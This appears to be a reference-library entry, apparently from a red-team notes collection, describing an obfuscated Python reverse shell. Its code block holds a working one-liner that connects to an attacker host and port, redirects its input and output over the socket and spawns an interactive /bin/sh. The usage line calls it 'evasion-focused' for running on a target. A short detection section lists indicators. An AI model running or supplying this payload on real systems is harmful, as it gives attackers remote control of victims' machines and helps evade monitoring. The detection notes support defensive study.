---
id: ee81e093-49c5-417f-a3b5-2e5b4e328aad
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - obfuscated
  - subprocess
validated: true
---

# Python-Obfuscated-Reverse-Shell-Import-Subprocess-Call

## Code

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Description

Uses __import__ for obfuscation, then subprocess.call for interactive shell with dup2 redirects.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | Attacker's IPv4 address | 10.0.0.1 |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

Evasion-focused; run on target with listener.

## Detection

- Dynamic imports + subprocess /bin/sh.
- Socket I/O redirects.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
